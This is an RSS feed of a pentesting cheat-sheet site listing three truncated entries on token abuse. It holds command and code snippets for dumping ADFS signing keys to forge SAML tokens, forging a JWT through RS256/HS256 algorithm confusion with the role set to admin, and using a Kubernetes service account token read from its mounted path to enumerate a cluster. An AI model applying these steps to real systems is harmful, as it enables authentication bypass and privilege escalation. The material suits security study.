<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Token-Based Authentication on TLDRBins</title>
    <link>https://tldrbins.github.io/@token-based-authentication/</link>
    <description>Recent content in Token-Based Authentication on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@token-based-authentication/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ADFS</title>
      <link>https://tldrbins.github.io/adfs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adfs/</guid>
      <description>Abuse #1: Generate a SAML 2.0 token for some app Windows 1. Dump encrypted PFX and DKM key # With ADFS service account .\ADFSDump.exe Ref: ADFSDump&#xA;2. Convert to binary blob # Copy private key(s) echo &amp;#39;&amp;lt;PRIVATE_KEY&amp;gt;&amp;#39; | sed &amp;#39;s/-//g&amp;#39; | xxd -r -p &amp;gt; DkmKey.bin # Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End cat b64_blob | base64 -d &amp;gt; EncryptedPfx.bin 3. Check which private key is correct # The correct key will not show error python ADFSpoof.</description>
    </item>
    <item>
      <title>JWT</title>
      <link>https://tldrbins.github.io/jwt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/jwt/</guid>
      <description>Abuse #1: Algorithm confusion 0. Sample jwks.json { &amp;#34;keys&amp;#34;: [ { &amp;#34;kty&amp;#34;: &amp;#34;RSA&amp;#34;, &amp;#34;use&amp;#34;: &amp;#34;sig&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;&amp;lt;BASE64_n&amp;gt;&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;AQAB&amp;#34; } ] } 1. Create a public key # Invoking python interpreter python3 from base64 import urlsafe_b64decode from Crypto.PublicKey import RSA e = int.from_bytes(urlsafe_b64decode(b&amp;#39;AQAB&amp;#39;)) n = int.from_bytes(urlsafe_b64decode(b&amp;#39;&amp;lt;BASE64_N&amp;gt;&amp;#39;)) key = RSA.construct((n, e)) # Save it to public.pem print(key.exportKey().decode()) 2. Forge a jwt # For example, modify role to admin python3 jwt_tool.</description>
    </item>
    <item>
      <title>Kubernetes</title>
      <link>https://tldrbins.github.io/kubernetes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kubernetes/</guid>
      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Basic Commands # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get pods --all-namespaces # List pods in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.</description>
    </item>
  </channel>
</rss>
